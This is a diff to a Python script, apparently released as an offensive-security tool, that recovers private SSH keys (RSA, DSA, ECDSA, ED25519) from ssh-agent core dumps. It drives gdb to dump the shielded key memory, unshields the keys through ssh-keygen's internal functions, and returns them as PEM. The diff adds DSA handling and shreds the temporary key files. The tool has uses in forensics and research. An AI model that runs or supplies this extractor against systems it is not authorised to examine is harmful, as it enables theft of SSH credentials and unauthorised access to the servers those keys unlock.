@@ -1,9 +1,9 @@
 #!/usr/bin/python3
 
 # A script to automate the extraction of SSH keys from a ssh-agent process memory dump
+# Supports: RSA, DSA, ED25519, ECDSA
 # Author: @Kracken256
-# Version: 1.0
-# TODO: Add support for DSA keys
+# Version: 2.0
 
 
 import os
@@ -22,10 +22,10 @@ r
 set $miak = (struct sshkey *)sshkey_new(0)
 set $shielded_private = (unsigned char *)malloc(1392)
 set $shield_prekey = (unsigned char *)malloc(16384)
-set $fd = fopen("/tmp/rsa-priv-shield.raw", "r")
+set $fd = fopen("/tmp/key-priv-shield.raw", "r")
 call fread($shielded_private, 1, 1392, $fd)
 call fclose($fd)
-set $fd = fopen("/tmp/rsa-prekey-shield.raw", "r")
+set $fd = fopen("/tmp/key-prekey-shield.raw", "r")
 call fread($shield_prekey, 1, 16384, $fd)
 call fclose($fd)
 set $miak->shielded_private=$shielded_private
@@ -36,15 +36,16 @@ call sshkey_unshield_private($miak)
 bt
 f 1
 x *kp
-call sshkey_save_private(*kp, "/tmp/rsa-extracted.pem", "", "comment", 0, \"\\x00\", 0)
+call sshkey_save_private(*kp, "/tmp/key-extracted.pem", "", "comment", 0, \"\\x00\", 0)
 k
 q
 """
 
-program_version = 'v1.0'
+program_version = 'v2.0'
 
 
 log.info(f"SSH Key Finder {program_version}")
+log.info("Author: @Kracken256")
 
 
 def find_magic_marker(filepath: str) -> int:
@@ -170,6 +171,10 @@ def find_identity(coredump: str, binary_path, pointer: int, i: int) -> int:
     return other_pointer
 
 
+def shred_file(filepath: str):
+    subprocess.run(f"shred -uzf {filepath}", shell=True)
+
+
 def find_sshkey(coredump: str, binary_path, pointer: int):
     data = gdb_run_command_parse(
         f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/8gx {pointer}' -ex 'quit' -q")
@@ -198,11 +203,11 @@ def dump_ecdsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
 
     # Dump the shielded private key from core
     run_system_command(
-        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/rsa-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}' -ex 'quit' -q")
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}' -ex 'quit' -q")
 
     # Dump the shielded prekey from core
     run_system_command(
-        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/rsa-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}' -ex 'quit' -q")
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}' -ex 'quit' -q")
 
     # Unshield the private key
 
@@ -210,12 +215,13 @@ def dump_ecdsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
     sp.communicate()
-    os.unlink("./peda-session-ssh-keygen.txt")
-    os.unlink("/tmp/rsa-prekey-shield.raw")
-    os.unlink("/tmp/rsa-priv-shield.raw")
-    with open("/tmp/rsa-extracted.pem", "r") as file:
+
+    # Secure the private key
+    shred_file("/tmp/key-prekey-shield.raw")
+    shred_file("/tmp/key-priv-shield.raw")
+    with open("/tmp/key-extracted.pem", "r") as file:
         data = file.read()
-        os.unlink("/tmp/rsa-extracted.pem")
+        shred_file("/tmp/key-extracted.pem")
         return data
 
 
@@ -238,11 +244,11 @@ def dump_rsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
 
     # Dump the shielded private key from core
     run_system_command(
-        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/rsa-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}' -ex 'quit' -q")
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}' -ex 'quit' -q")
 
     # Dump the shielded prekey from core
     run_system_command(
-        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/rsa-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}' -ex 'quit' -q")
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}' -ex 'quit' -q")
 
     # Unshield the private key
 
@@ -250,13 +256,50 @@ def dump_rsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
     sp.communicate()
-    os.unlink("./peda-session-ssh-keygen.txt")
-    os.unlink("/tmp/rsa-prekey-shield.raw")
-    os.unlink("/tmp/rsa-priv-shield.raw")
-    with open("/tmp/rsa-extracted.pem", "r") as file:
+    shred_file("/tmp/key-prekey-shield.raw")
+    shred_file("/tmp/key-priv-shield.raw")
+    with open("/tmp/key-extracted.pem", "r") as file:
         data = file.read()
+        shred_file("/tmp/key-extracted.pem")
+        return data
 
-        os.unlink("/tmp/rsa-extracted.pem")
+
+def dump_dsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
+    raw_sshkey = None
+    raw_sshkey = gdb_run_command_parse(
+        f"gdb {binary_path} {coredump} -ex 'echo StartOfExec\n' -ex 'x/28gx {sshkey_ptr}' -ex 'quit' -q")
+
+    shielded_private = int.from_bytes(
+        raw_sshkey[0x90-8:0x90], byteorder='big', signed=False)
+
+    shielded_private_size = int.from_bytes(
+        raw_sshkey[0x90:0x90 + 8], byteorder='big', signed=False)
+
+    shielded_prekey = int.from_bytes(
+        raw_sshkey[0x90+8:0x90+16], byteorder='big', signed=False)
+
+    shielded_prekey_size = int.from_bytes(
+        raw_sshkey[0x90+16:0x90+24], byteorder='big', signed=False)
+
+    # Dump the shielded private key from core
+    run_system_command(
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}' -ex 'quit' -q")
+
+    # Dump the shielded prekey from core
+    run_system_command(
+        f"gdb {binary_path} {coredump} -ex 'dump memory /tmp/key-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}' -ex 'quit' -q")
+
+    # Unshield the private key
+
+    sp = subprocess.Popen(["gdb", "./ssh-keygen"], stdin=subprocess.PIPE,
+                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
+    sp.communicate()
+    shred_file("/tmp/key-prekey-shield.raw")
+    shred_file("/tmp/key-priv-shield.raw")
+    with open("/tmp/key-extracted.pem", "r") as file:
+        data = file.read()
+        shred_file("/tmp/key-extracted.pem")
         return data
 
 
@@ -318,6 +361,15 @@ def extract_keys(filepath: str, ssh_agent) -> List[str]:
                     raise Exception("Could not dump RSA key.")
                 log.success("RSA key extracted")
                 keys.append(rsa_ssh)
+            elif key_type == 1:
+                log.info("DSA key found")
+                # Dump the key data
+                dsa_ssh = dump_dsa(filepath, ssh_agent, second_pointer)
+                if not dsa_ssh:
+                    log.warn("Error: Could not dump DSA key.")
+                    raise Exception("Could not dump DSA key.")
+                log.success("DSA key extracted")
+                keys.append(dsa_ssh)
             elif key_type == 3:
                 log.info("ECDSA key found")
                 ecdsa_ssh = dump_ecdsa(filepath, ssh_agent, second_pointer)
@@ -334,12 +386,13 @@ def extract_keys(filepath: str, ssh_agent) -> List[str]:
 
 def main():
     # Get filepaths (coredumps) from command line arguments
-    if (len(sys.argv) < 3):
+    if (len(sys.argv) < 2):
         print(
-            f"Usage: python3 {sys.argv[0]} <ssh-agent> <coredump>")
+            f"Usage: python3 {sys.argv[0]} <coredump>")
         sys.exit(1)
-    filepaths = sys.argv[2]
-    keys = extract_keys(filepaths, sys.argv[1])
+    filepaths = sys.argv[1]
+    ssh_agent = '/usr/bin/ssh-agent'  # default ssh-agent path
+    keys = extract_keys(filepaths, ssh_agent)
     if keys is None:
         print("Error extracting SSH keys from the memory dumps.")
         sys.exit(1)
